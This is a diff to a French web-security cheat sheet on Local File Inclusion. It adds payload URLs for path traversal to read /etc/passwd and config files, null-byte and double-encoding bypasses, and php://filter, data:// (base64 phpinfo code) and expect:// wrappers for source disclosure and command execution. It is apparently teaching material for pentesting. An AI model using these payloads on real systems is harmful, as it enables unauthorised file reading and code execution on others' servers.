@@ -77,6 +77,8 @@ Exemple de LFI :
 <?php @include("./page/".$_GET['page']) ?>
 ```
 
+**Basic LFI**
+
 ```https://fhbapt.github.io/?page=index.php``` Récupération du fichier index.php
 
 ```https://fhbapt.github.io/?page=../config.php``` Récupération du fichier config.php
@@ -92,9 +94,28 @@ Les fichiers intéressants :
  * Fichiers de logs
  * Fichiers de backups
 
-Null Byte, Double encoding :
+**Null Byte, Double encoding**
 
 ```https://fhbapt.github.io/?page=etc/password%00``` Null Byte : %00
+
+**Double Encoding**
+
+```https://fhbapt.github.io/?page=%252e%252e%252fetc%252fpasswd```
+```https://fhbapt.github.io/?page=%252e%252e%252fetc%252fpasswd%00```
+
+**Wrapper php://filter**
+
+```https://fhbapt.github.io/?page=php://filter/convert.base64-encode/resource=index.php```
+```http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php```
+
+**Wrapper data://**
+
+```https://fhbapt.github.io/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==```
+La payload est ```<?php phpinfo(); ?>```
+
+**Wrapper expect://**
+
+```https://fhbapt.github.io/?page=expect://ls```
 
 ### RFI (Remote File Inclusion) <a name="rfi"></a>
 
